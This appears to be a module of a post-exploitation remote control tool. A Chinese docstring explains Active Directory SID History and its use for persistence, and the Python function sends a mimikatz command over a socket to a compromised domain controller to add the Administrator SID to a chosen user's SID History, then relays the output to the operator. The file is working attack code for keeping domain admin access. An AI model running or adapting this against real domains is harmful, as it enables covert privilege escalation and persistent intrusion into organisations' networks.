import struct

"""
   每个用户都有自己的 SID。SID 的作用主要是跟踪安全主体控制用户连接资源时的访问权限。SID History 是在域迁移过程中需要使用的一个属性。
   如果将 A 域中的域用户迁移到 B 域中，那么在 B 域中新建的用户的 SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本
来可以访问的资源。SID History 的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的 SID 改变了，系统会将其原来的SID 添加到
迁移后用户的 SID Histry 属性中，使迁后的用户保持原有权限、能够访问其原来可以访问的资源。使用 mimikatz，可以将 SID History 属性添加
到域中任意用户的 SID History 属性中。在渗透测试中，如果获得了域管理员权限(或者等同于域管理员的权限)就可以将 SID History作为实现持久化的方法。
"""


# SID
# 以下操作在域控执行
def SID_History(conn, choice):
    command = "mimikatz.exe \"privilege::debug\" \"sid::patch\" \"sid::add /sam:" + choice.split()[1] + " /new:administrator\" exit"
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
    print('\033[1;34;34m' + "[*] You can now attempt to connect to the domain controller using the ipc protocol through domain user " + choice.split()[1] + '\033[0m')
